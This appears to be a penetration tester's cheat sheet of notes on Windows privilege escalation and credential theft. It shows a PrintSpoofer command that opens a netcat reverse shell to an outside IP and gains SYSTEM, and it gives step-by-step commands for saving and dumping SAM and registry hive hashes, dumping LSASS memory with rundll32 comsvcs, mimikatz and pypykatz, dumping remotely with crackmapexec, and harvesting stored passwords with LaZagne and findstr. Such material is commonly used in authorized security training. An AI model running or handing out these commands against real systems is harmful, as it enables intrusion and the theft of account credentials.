# Vulnerabilities
## Rogue Potato

## Juicy/Lovely Potato

## PrintSpoofer [https://github.com/itm4n/PrintSpoofer]
Service Account (IIS/MSSQL) got privilge SeImpersonatePrivilege 

Create a reverse shell:
```powershell
C:\TOOLS>PrintSpoofer.exe -c "C:\TOOLS\nc.exe 10.10.13.37 1337 -e cmd"
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK

Netcat listener:

C:\TOOLS>nc.exe -l -p 1337
Microsoft Windows [Version 10.0.19613.1000]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
nt authority\system
```





# Passwords Attacks
## Attacking SAM
With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.
Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:
Registry Hive 	Description
hklm\sam 	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
hklm\system 	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
hklm\security 	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

We can create backups of these hives using the reg.exe utility.

### Using reg.exe save to Copy Registry Hives
```powershell
> reg.exe save hklm\sam C:\sam.save
> reg.exe save hklm\system C:\system.save
> reg.exe save hklm\security C:\security.save
```

#### Dumping Hashes Offline
One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:

```bash
$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

### Mimikatz
```bash
mimikatz > privilege::debug
mimikatz > token::elevate
mimikatz > lsadump::sam
```

### Dumping Hashes Remote
```bash
$ crackmapexec smb <IP/RANGE> --local-auth -u <USERNAME> -p <PASSWORD> --sam`
$ crackmapexec smb <IP/RANGE> -u <USERNAME> -p <PASSWORD> --sam`
$ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<IP> 
```

### Cracking Hashes with Hashcat


## Attacking LSA
### Dumping LSASS Process Memory
Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.

#### Task Manager Method
Open Task Manager > Select the Processes tab > Find & right click the Local Security Authority Process > Select Create dump file
A file called lsass.DMP is created and saved in: 
- `C:\Users\loggedonusersdirectory\AppData\Local\Temp`

#### Rundll32.exe & Comsvcs.dll Method
The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.

Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:

##### Finding LSASS PID in cmd
```
# find lsass.exe and its process ID in the PID field.
> tasklist /svc
```

##### Finding LSASS PID in PowerShell
```powershell
# see the process ID in the Id field
Get-Process lsass
```

##### Creating lsass.dmp using PowerShell
Once we have the PID assigned to the LSASS process, we can create the dump file.
With an elevated PowerShell session, we can issue the following command to create the dump file:
```powershell
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <PID> C:\lsass.dmp full
```

With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.

If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.

#### Dumping Hashes Offline
Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.

Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out.
Running Pypykatz

The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:

```bash
$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp`
```

### Mimikatz
```bash
mimikatz > privilege::debug
mimikatz > token::elevate

#Dump LSASS:
mimikatz > sekurlsa::logonpasswords

#Dump and save LSASS in a file
mimikatz > sekurlsa::minidump c:\temp\lsass.dmp

# Dump LSA
mimikatz > lsadump::secrets
```

### Dumping Hashes Remote
```bash
$ crackmapexec smb <IP/RANGE> --local-auth -u <USERNAME> -p <PASSWORD> --lsa
$ crackmapexec smb <IP/RANGE> -u <USERNAME> -p <PASSWORD> --lsa
$ secretsdump.py <DOMAIN>/<USER>:<PASSWORD>@<IP> 
```

### Cracking the NT Hash with Hashcat


# Credential Harvesting
## Key Terms to Search

Passwords 	Passphrases 	Keys
Username 	User account 	Creds
Users 	Passkeys 	Passphrases
configuration 	dbcredential 	dbpassword
pwd 	Login 	Credentials

## Search Tools
With access to the GUI, it is worth attempting to use Windows Search to find files on the target using some of the keywords mentioned above.

By default, it will search various OS settings and the file system for files & applications containing the key term entered in the search bar.


### Running Lazagne All
We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store. It would be beneficial to keep a standalone copy of Lazagne on our attack host so we can quickly transfer it over to the target. Lazagne.exe will do just fine for us in this scenario. We can use our RDP client to copy the file over to the target from our attack host. If we are using xfreerdp all we must do is copy and paste into the RDP session we have established.

```powershell
> start lazagne.exe all
```

### Using findstr
We can also use findstr to search from patterns across many types of files. Keeping in mind common key terms, we can use variations of this command to discover credentials on a Windows target:

```powershell
> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
> findstr /si "password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

## Additional Considerations
Here are some other places we should keep in mind when credential hunting:
    - Passwords in Group Policy in the SYSVOL share
    - Passwords in scripts in the SYSVOL share
    - Password in scripts on IT shares
    - Passwords in web.config files on dev machines and IT shares
    - unattend.xml
    - Passwords in the AD user or computer description fields
    - KeePass databases --> pull hash, crack and get loads of access.
    - Found on user systems and shares
    - Files such as pass.txt, passwords.docx, passwords.xlsx found on user systems, shares, Sharepoint

